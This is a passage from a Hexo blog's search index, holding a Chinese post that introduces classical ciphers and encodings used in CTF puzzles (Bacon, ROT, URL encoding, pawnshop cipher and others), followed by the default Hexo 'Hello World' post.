646。ASCII第一次以规范标准的类型发表是在1967年，最后一次更新则是在1986年，到目前为止共定义了128个字符  。<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210326211538721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/hzq8632385/article/details/81096053?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676459216780265420852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161676459216780265420852&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81096053.first_rank_v2_pc_rank_v29_10&utm_term=%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92">对于ASCII码解题的应用</a></p><h2 id="八、弱口令"><a href="#八、弱口令" class="headerlink" title="八、弱口令"></a>八、弱口令</h2><p>1.不使用空口令或系统缺省的口令，因为这些口令众所周知，为典型的弱口令。<br>2.口令长度不小于8个字符。<br>3.口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。<br>4.口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。<br>5.口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail地址等等与本人有关的信息，以及字典中的单词。<br>6.口令不应该为用数字或符号代替某些字母的单词。<br>7.口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。<br>8.至少90天内更换一次口令，防止未被发现的入侵者继续使用该口令。<br><strong>简单的说就是根据提供的信息来猜密码</strong></p><h2 id="九、培根密码"><a href="#九、培根密码" class="headerlink" title="九、培根密码"></a>九、培根密码</h2><p>培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：<br>第一种方式：<br>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab<br>K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb Y bbaaa Z bbaab<br>第二种方式<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA</p><p>f AABAB m ABABB s BAAAB z BABBB<br><a href="https://blog.csdn.net/weixin_42109012/article/details/97644262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676488516780265412446%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161676488516780265412446&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-97644262.first_rank_v2_pc_rank_v29_10&utm_term=%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81">参考大佬文章</a></p><h2 id="十、当铺密码"><a href="#十、当铺密码" class="headerlink" title="十、当铺密码"></a>十、当铺密码</h2><p>当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。<br>这是在找其他密码的时候发现的一种加密方式 也多学习吧<br><a href="https://blog.csdn.net/qq_43504939/article/details/97634976?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676495916780255280340%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161676495916780255280340&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-97634976.first_rank_v2_pc_rank_v29_10&utm_term=%E5%BD%93%E9%93%BA%E5%AF%86%E7%A0%81">当铺密码</a></p><h2 id="其他不常见密码"><a href="#其他不常见密码" class="headerlink" title="其他不常见密码"></a>其他不常见密码</h2><p><strong>1.URL编码</strong><br>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。<br><strong>2.ROT5/13/18/47编码</strong><br>ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：<br>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126<br><strong>3.Rabbit加密</strong><br>wohenshuai没有密钥时的密文U2FsdGVkX1+ft4xC4JD2V9fyoPBB5KIfOtQ=<br>wohenshuai当密钥为SL时的密文U2FsdGVkX1/lvvE1xQAngFK/rGKJS30nuZA=<br><strong>4.unicode编码</strong><br>例如N0bug加密后  &amp;# 78; &#48;&amp; #98;&#117;&amp;#1 03;<br><strong>5.跳舞的小人</strong><br>这个也是通过看大佬博客学习的 <strong>来自夏洛克福尔摩斯在《归来记》中侦探案件使用的一种加密方式。</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210326213100562.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>6.社会主义核心价值观编码</strong><br>友善爱国公正爱国爱国敬业民主诚信自由公正敬业爱国友善自由诚信平等友善爱国平等友善平等爱国爱国平等诚信自由平等敬业和谐友善自由平等<br>拿去解密吧 噶哈哈哈哈<br><strong>7.Quoted-printable</strong><br>直接上链接<a href="http://blog.chacuo.net/494.html">Quoted-printable</a><br><strong>8.MD5</strong><br><a href="https://www.cmd5.com/">MD5在线解码</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>只是总结了这一段自己遇到的和见到的密码 当然一定还有好多的密码等着我和你们去了解 暂时先写到这个  如果大家还看到有什么好的 没见过的加密方式 也欢迎交流交流</p><p><strong>最后给大家卖个关子</strong><br>祓酃鏊虢眔擴灝迣仩嘸難倳，呮啪洧杺亾眔鞹鰝<br>试试破解这一段吧！！！哈哈哈  加油加油 冲冲冲！  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/02/01/hello-world/"/>
      <url>/2021/02/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
